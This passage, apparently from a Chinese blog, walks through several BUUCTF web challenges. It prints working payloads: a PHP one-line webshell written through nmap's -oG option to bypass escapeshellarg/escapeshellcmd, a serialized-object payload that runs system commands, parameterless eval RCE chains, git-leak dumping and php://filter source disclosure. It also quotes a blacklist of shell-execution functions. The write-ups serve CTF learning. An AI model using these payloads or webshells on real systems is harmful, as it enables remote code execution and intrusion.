class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>); <span class="comment">//对host字符串进行转码转义</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// -sT，在目标主机的日志上记录大批连接请求和错误的信息</span></span><br><span class="line">    <span class="comment">// -Pn，扫描之前不需要用ping命令，有些防火墙禁止使用ping命令</span></span><br><span class="line">    <span class="comment">// -T5，时间优化参数，-T0~5，-T0扫描端口的周期大约为5分钟，-T5大约为5秒钟</span></span><br><span class="line">    <span class="comment">// --host-time限制扫描时间</span></span><br><span class="line">    <span class="comment">// -F，快速扫描</span></span><br></pre></td></tr></table></figure>

<p>这里命令的本意是让用户输入一个<code>IP</code>或者网址, 然后后台使用<code>nmap</code>对其进行扫描</p>
<p>因为<code>$host</code>最终会被拼接到<code>system</code>函数中,所以这里我们可以通过能够控制的<code>$host</code>变量来执行命令. 一般的思路是命令后注入的形式,例如<code>host</code>的值可以为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp; cat /flag</span><br></pre></td></tr></table></figure>

<p>但是这里由于<code>escapeshellarg</code>和<code>escapeshellcmd</code>的存在, 上面这样的命令会被引号括起来,同时<code>&amp;</code>这样的特殊符号也会在前面被加上<code>\</code>而转义(由具有逻辑意义的符号变为纯文本字符)</p>
<p>所以需要从其他角度来考虑如何执行命令,这里<code>Nmap</code>的 <code>-oG</code> 功能可以把执行结果输出到文件中, 那么这里就可以在<code>host</code>参数中写入一句话木马, 并通过<code>Namp</code>的输出功能将含有一句话木马代码的执行结果输出到文件中</p>
<p>输出文件的路径代码里也给出来了, 目录名也就是<code>sandbox</code>这个变量的值</p>
<p>那么不考虑<code>escapeshellarg</code>和<code>escapeshellcmd</code>的话,payload可以为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php</span><br><span class="line">这样最终执行的命令就是:</span><br><span class="line">system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php&quot;);</span><br></pre></td></tr></table></figure>

<p>但是<code>escapeshellarg</code>和<code>escapeshellcmd</code>会对传入字符串中的特殊字符进行转义,以保证传入<code>shell</code>的参数字符串是安全的</p>
<p>其中<code>escapeshellarg</code>会在未配对的单引号前面加上<code>\</code>,然后再在转义后的<code>\&#39;</code>两段再加上一对单引号,最后再在整个字符串的两端加上一对单引号</p>
<p><code>escapeshellcmd</code>会在下列特殊字符(包括<code>/</code>)以及不成对的单引号前面加上<code>\</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：`&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\`、`\x0A` 和 `\xFF`。</span><br></pre></td></tr></table></figure>

<p>这两者单独使用都没有问题,而当对一个字符串先使用<code>escapeshellarg</code>在使用<code>escapeshellcmd</code>处理时,就会出现漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host1</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host2</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host3</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host1</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host1</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host2</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host3</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php 时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">此时命令无法正确执行</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27; 时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;\\&#x27;&#x27;\&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;时输出:</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;时输出(最后的引号前多了一个空格)</span></span><br><span class="line"><span class="comment">nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span></span><br><span class="line"><span class="comment">$b: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\&#x27;&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php&#x27;\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">$c: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php&#x27;</span></span><br><span class="line"><span class="comment">$d: nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[a\]\)\?\&gt; -oG a.php &#x27;\\&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">这里最后我们输入的这部分字符串实际上被分成了三部分, 前面的&#x27;&#x27;\\&#x27;&#x27;, 中间的主体部分,后面的&#x27;\\&#x27;&#x27;&#x27;. 后面这部分和主体部分中间使用空格分开了,所以不会对命令的执行造成影响.</span></span><br><span class="line"><span class="comment">对比这里的$b和$d, $b最外层还是有一对单引号包裹了整个字符串的,而$d中,由于前面和后面各多出了一个\,导致$d中主体部分前面和后面的单引号不再产生关联.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>那么最后的<code>payload</code>(用单引号包裹,同时后面的单引号前面加一个空格)</p>
<p>这里<code>escapeshellarg</code>和<code>escapeshellcmd</code>的共用实际上是帮助我们逃脱了原本<code>escapeshellarg</code>在字符串两侧加的那一对单引号的控制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27;&lt;?php eval($_POST[a])?&gt; -oG a.php &#x27;</span><br><span class="line">网页输出: 执行成功</span><br><span class="line">you are in sandbox d59f507b1cb8dcb30bc5499203a99ac3Starting Nmap 7.70 ( https://nmap.org ) at 2022-10-19 03:07 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.83 seconds</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接后在根目录找到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8e45810b-81c1-4484-8dd3-e42274c1394c.node4.buuoj.cn:81/d59f507b1cb8dcb30bc5499203a99ac3/a.php</span><br></pre></td></tr></table></figure>

<p>另外,其实如果能猜到flag的路径的话,payload直接这样写也可以:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: date(): It is not safe to rely on the system&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24</span><br><span class="line">2022-10-19 06:41:06 am</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019144853752-166704781973599.png" alt="image-20221019144853752" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=date&amp;p=Y-m-d+h:i:s+a</span><br></pre></td></tr></table></figure>

<p>这里<code>func</code>的值改成别的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=a&amp;p=Y-m-d+h:i:s+a</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019150119174-1667047819735100.png" alt="image-20221019150119174" style="zoom:67%;" />

<p>这里是调用了<code>call_user_func()</code>函数, 用来调用其他函数,其第一个参数是被调用的函数名, 后面的参数是要传给这个被调用函数的参数</p>
<p><code>show_source</code>函数被过滤了</p>
<img src="/images/buuctf-web/image-20221019150406768.png" alt="image-20221019150406768" style="zoom:80%;" />



<p>尝试<code>highlight_file</code>: 成功输出了<code>index.php</code>的源码</p>
<img src="/images/buuctf-web/image-20221019150655094-1667047819735101.png" alt="image-20221019150655094" style="zoom:67%;" />

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="comment">//被禁用的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>); <span class="comment">//漏洞在这里,这里$func是用户可控的,所以可以执行用户的命令</span></span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>); <span class="comment">//func转为小写字母</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123; <span class="comment">//检查func中是否为禁用函数</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>); <span class="comment">//调用gettime</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里看到有定义<code>Test</code>类,并且有<code>__destruct</code>魔术方法,可能会用到<strong>反序列化</strong>. 同时注意到,这里如果通过<code>Test</code>类的<code>__destruct</code>来执行<code>func</code>的话,可以绕过黑名单的检测</p>
<p><strong>那么现在的思路就是给网站直接传的参数中,<code>func</code>传反序列化函数<code>unserialize</code>,<code>p</code>传一个待反序列化的字符串</strong></p>
<p><strong>然后后台通过<code>call_user_func</code>执行反序列化时,又会调用<code>__destruct</code>魔术方法</strong></p>
<p><strong>从而解析类属性中的<code>func</code>和<code>p</code>并执行,而此处的<code>func</code>(也就是我们通过构造待反序列化的字符串传的<code>func</code>)是不受黑名单控制的</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先扫描一下根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019152637740-1667047819735102.png" alt="image-20221019152637740" style="zoom:67%;" />

<p>扫描<code>/tmp</code>目录,发现flag文件</p>
<img src="/images/buuctf-web/image-20221019152724140-1667047819735104.png" alt="image-20221019152724140" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221019152813806-1667047819735103.png" alt="image-20221019152813806" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>进来看源码,抓包,啥也没有</p>
<img src="/images/buuctf-web/image-20221019160827439.png" alt="image-20221019160827439" style="zoom:67%;" />

<p>那就扫目录吧:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/&quot; --delay=1</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019161053431-1667047819735105.png" alt="image-20221019161053431" style="zoom:67%;" />

<p>发现了<code>/.git</code>目录,<strong>存在<code>git</code>泄露,通过<code>Githack</code>工具来利用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(kali上):</span><br><span class="line">python3 GitHack.py http://6cfa03fc-73cc-475a-a1d3-cede7532f1cd.node4.buuoj.cn:81/.git/</span><br></pre></td></tr></table></figure>

<p>成功下载了<code>index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//禁用了伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">//在参数3中匹配参数1,将匹配到的内容替换为参数2</span></span><br><span class="line">            <span class="comment">//?R的意思是递归</span></span><br><span class="line">            <span class="comment">//这里参数一的正则表达式用来匹配 abc(bcd()),abc(bcd(def())) (后面还能无限递归嵌套) 这样的字符串</span></span><br><span class="line">            <span class="comment">//匹配到后将其替换为空,所以如果exp传了 a(b(c())); 替换之后就只剩下一个分号,才能使整个表达式为TRUE</span></span><br><span class="line">            <span class="comment">//所以这里很显然是需要进行无参数的RCE了</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>无参数RCE:</p>
<p>读取当前目录: 这里<code>getcwd</code>函数被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019175758566.png" alt="image-20221019175758566" style="zoom:67%;" />

<p><strong>flag就在当前目录下,那么可以通过<code>array_reverse</code>将数组逆序,然后<code>next</code>取到下一个成员,也就是<code>flag.php</code>,最后通过<code>show_source</code>来读取就可以了.</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(show_source(next(array_reverse(scandir(pos(localeconv()))))));</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221019180018891.png" alt="image-20221019180018891" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php   </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一步,让<code>text</code>参数从<code>data</code>协议的数据流中读数到”I have a dream”即可,然后<code>file</code>参数使用<code>php</code>伪协议来输出<code>base64</code>编码后的<code>next.php</code>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9c3638f1-e9c9-4e78-8982-bd06c9f37d47.node4.buuoj.cn:81/?text=next.php&amp;text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>

<p>将输出解码得到<code>next.php</code>的源码:</p>
